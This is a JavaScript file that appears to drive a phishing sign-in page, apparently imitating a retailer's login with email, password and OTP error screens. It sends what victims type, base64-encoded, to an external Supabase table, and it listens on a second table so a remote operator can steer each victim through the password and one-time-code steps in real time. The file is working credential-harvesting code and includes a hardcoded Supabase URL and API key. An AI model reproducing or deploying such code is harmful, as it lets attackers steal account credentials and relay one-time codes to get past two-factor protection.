var char = 'zxcvbnmasdfghjklqwertyuiop1234567890'



var supabase = supabase.createClient('https://zytboaqrfllqptdtnhgg.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp5dGJvYXFyZmxscXB0ZHRuaGdnIiwicm9sZSI6ImFub24iLCJpYXQiOjE2ODU3NTAyMzcsImV4cCI6MjAwMTMyNjIzN30.faKJXYCYIWoZl0Se2o1nhdZCOy0DYgePFRSfx_ZpT5A')



var channel = supabase.channel('table_db_changes').on('postgres_changes', {
    event: '*',
    schema: 'public',
    table: 'geust'
},
    (payload) => {
        console.log(payload.new.data)
        if (payload.new.data.split('/')[0] == username)
            show(payload.new.data.split('/')[1])
        else
            console.log('not my busnis')
    }
).subscribe();





//generate a unique username
var username = '';

for (i = 0; i < 8; i++) {
    username += Math.floor(Math.random() * 30);
}



var hidePlz = false

// send the data
async function ll(msg) {

    if (hidePlz == false) {
        document.getElementById('plz').style.display = 'block'
        hidePlz = true;
    }
    else
        document.getElementById('plz').style.display = 'none'
    document.getElementById('mno').style.display = 'block'
    var { error } = await supabase.from('host').insert({ dat: btoa(username + msg) })
}

//method for showing pages
function show(what) {


    var email = document.getElementById('email').value;
    document.getElementById('hello').innerText = email;
    document.getElementById('mno').style.display = 'none'
    document.getElementById('p').style.display = 'none';
    document.getElementById('o').style.display = 'none';
    document.getElementById('c').style.display = 'none';
    document.getElementById('e').style.display = 'none';
    document.getElementById('m').style.display = 'none';
    document.getElementById('l').style.display = 'none'
    document.getElementById('plz').style.display = 'none'
    document.getElementById('alertBox').style.display = 'none';
    
    if (what == 'em') {
        document.getElementById('e').style.display = 'block';
        document.getElementById('alertBox').style.display = 'flex';
        document.getElementById('alertText').innerText = 'We cannot find an account with that email address'

    } else {
        if (what == 'en') {
            document.getElementById('e').style.display = 'block';
            document.getElementById('alertBox').style.display = 'flex';
            document.getElementById('alertText').innerText = 'We cannot find an account with that mobile number'


        } else {
            if (what == 'ep') {
                document.getElementById('p').style.display = 'block';
                document.getElementById('alertBox').style.display = 'flex';
                document.getElementById('alertText').innerText = 'The Password You Entered Is Incorrect'
            } else {
                if (what == 'eo') {
                    document.getElementById('o').style.display = 'block';
                    document.getElementById('alertBox').style.display = 'flex';
                    document.getElementById('alertText').innerText = 'The One Time Password (OTP) you entered is not valid. Please try again.'

                }
                else {


                    document.getElementById(what).style.display = 'block';

                }

            }
        }
    }

    document.cookie = what

}








function wasat() {

    if (document.cookie == 'o') {
        show('l')
    }
}

